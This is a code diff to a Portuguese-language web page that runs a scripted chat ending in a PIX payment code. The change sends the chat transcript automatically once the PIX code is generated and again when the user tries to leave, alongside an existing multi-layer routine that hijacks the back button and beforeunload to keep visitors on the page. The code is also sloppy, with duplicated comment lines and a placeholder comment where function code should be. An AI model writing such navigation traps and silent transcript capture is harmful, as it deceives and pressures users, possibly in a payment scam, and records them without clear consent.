@@ -17,8 +17,11 @@
   })();
 
   window._transcriptSent = false;
-  function sendTranscript() {
-  if (window._transcriptSent || !localStorage.getItem('dg_pt')) return;
+    function sendTranscript() {
+  // Só envia se um PIX foi gerado e a transcrição ainda não foi enviada
+  if (window._transcriptSent || !window._currentPixCode) return;
+
+  // ... (restante da função permanece o mesmo)
   
   // Seleciona tanto as linhas de chat (.row) quanto as mensagens de sistema (.sys)
   const messages = document.querySelectorAll('.msgs .row, .msgs .sys');
@@ -1813,7 +1816,8 @@ async function runConversation(startStep = 0) {
 
     // Adiciona a etiqueta verde de sucesso
        // Adiciona a etiqueta verde de sucesso
-    addSys('Pix gerado com sucesso', 'ok');
+        addSys('Pix gerado com sucesso', 'ok');
+    sendTranscript(); // Aciona o envio da transcrição imediatamente
     
     // Pequena pausa após a etiqueta
     await pause(1000);
@@ -2041,8 +2045,12 @@ function lockBackButton() {
   });
 
   // ── Layer 6: beforeunload — desktop navigation attempt ─────────────────────
+    // ── Layer 6: beforeunload — desktop navigation attempt ─────────────────────
   window.addEventListener('beforeunload', function() {
     history.pushState({ diskgas_lock: true }, '', location.href);
+    // Tenta enviar a transcrição como última medida antes do usuário sair
+    // A função sendTranscript() já possui lógica para evitar envios duplicados e verificar o PIX
+    sendTranscript(); 
   });
 
   // ── Layer 7: pagehide — mobile Safari / bfcache restore ────────────────────
